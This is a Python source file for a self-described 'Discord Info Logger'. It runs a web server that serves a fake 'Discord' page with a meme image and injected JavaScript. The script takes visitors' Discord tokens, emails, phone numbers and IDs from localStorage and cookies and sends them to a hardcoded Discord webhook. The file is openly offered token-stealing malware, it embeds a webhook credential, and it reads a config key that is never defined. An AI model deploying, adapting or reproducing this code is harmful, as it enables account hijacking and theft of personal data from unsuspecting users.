from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, re, json
import threading

__app__ = "Discord Info Logger"
__description__ = "Collecte les informations Discord des utilisateurs"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY",
    "image": "https://duckduckgo.com/?q=meme+png&ia=images&iax=images&iai=https%3A%2F%2Fwww.pngmart.com%2Ffiles%2F11%2FTrollface-Meme-PNG-Picture.png",
    "username": "Discord Logger",
    "color": 0x5865F2,
    "tokenStealing": True,
    "collectUserInfo": True,
    "message": {
        "doMessage": False,
        "message": "Chargement...",
        "richMessage": True,
    },
    "redirect": {
        "redirect": False,
        "page": "https://discord.com"
    }
}

def extractDiscordInfo(data):
    info = {}
    
    # Extraction du token
    token_patterns = [
        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}',
        r'mfa\.[a-zA-Z0-9_-]{84}',
        r'[a-zA-Z0-9_-]{32}'
    ]
    
    for pattern in token_patterns:
        matches = re.findall(pattern, data)
        if matches:
            info['token'] = matches[0]
            break
    
    # Extraction des informations utilisateur depuis localStorage
    user_patterns = [
        r'"username":"([^"]+)"',
        r'"email":"([^"]+)"',
        r'"phone":"([^"]+)"',
        r'"id":"(\d+)"',
        r'"discriminator":"(\d+)"',
        r'"avatar":"([^"]+)"',
        r'"global_name":"([^"]+)"'
    ]
    
    for pattern in user_patterns:
        matches = re.findall(pattern, data)
        if matches:
            key = pattern.split('"')[1]
            info[key] = matches[0]
    
    return info

def sendDiscordInfo(discord_info, useragent):
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "🎯 Informations Discord Capturées!",
            "color": config["color"],
            "description": "**Informations Utilisateur:**\n",
            "fields": []
        }]
    }
    
    field_mapping = {
        'username': '👤 Pseudo',
        'global_name': '🏷️ Nom Global',
        'email': '📧 Email',
        'phone': '📱 Téléphone',
        'id': '🆔 ID Utilisateur',
        'discriminator': '#️⃣ Discriminateur',
        'avatar': '🖼️ Avatar',
        'token': '🔑 Token'
    }
    
    for key, value in discord_info.items():
        if key in field_mapping:
            field_value = f"||{value}||" if key == 'token' else value
            embed["embeds"][0]["fields"].append({
                "name": field_mapping[key],
                "value": field_value,
                "inline": True
            })
    
    embed["embeds"][0]["fields"].append({
        "name": "🌐 User-Agent",
        "value": f"```{useragent[:200]}...```",
        "inline": False
    })
    
    requests.post(config["webhook"], json=embed)

def injectDataCollection():
    return '''
<script>
// Collecte des informations Discord
function collectDiscordInfo() {
    const info = {};
    
    // Récupération depuis localStorage
    try {
        const token = localStorage.getItem('token') || 
                     localStorage.getItem('discord_token') ||
                     document.cookie.split(';').find(c => c.trim().startsWith('dc_token='))?.split('=')[1];
        
        if (token) info.token = token;
        
        // Récupération des infos utilisateur
        const userStr = localStorage.getItem('user_settings_cache') ||
                       localStorage.getItem('user');
        
        if (userStr) {
            const userData = JSON.parse(userStr);
            if (userData.username) info.username = userData.username;
            if (userData.email) info.email = userData.email;
            if (userData.phone) info.phone = userData.phone;
            if (userData.id) info.id = userData.id;
            if (userData.discriminator) info.discriminator = userData.discriminator;
            if (userData.avatar) info.avatar = userData.avatar;
            if (userData.global_name) info.global_name = userData.global_name;
        }
    } catch(e) {}
    
    // Envoi des données
    if (Object.keys(info).length > 0) {
        fetch(window.location.href, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        });
    }
}

// Exécution immédiate et après chargement
collectDiscordInfo();
setTimeout(collectDiscordInfo, 2000);
</script>
'''

class DiscordLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Traitement POST pour les données collectées
            if self.command == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                try:
                    discord_info = json.loads(post_data)
                    sendDiscordInfo(discord_info, self.headers.get('user-agent', ''))
                except:
                    pass
                
                self.send_response(200)
                self.end_headers()
                return

            # Page HTML avec image et injection
            html_content = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <style>
        body {{ margin: 0; padding: 0; background: #36393f; }}
        .container {{ 
            width: 100vw; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            background-image: url('{url}');
            background-size: cover;
            background-position: center;
        }}
    </style>
</head>
<body>
    <div class="container"></div>
    {injectDataCollection()}
</body>
</html>
'''

            if config["redirect"]["redirect"]:
                html_content = f'<meta http-equiv="refresh" content="2;url={config["redirect"]["page"]}">'
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            print(f"Error: {e}")

    do_GET = handleRequest
    do_POST = handleRequest

def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, DiscordLoggerAPI)
    print(f"Serveur démarré sur le port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
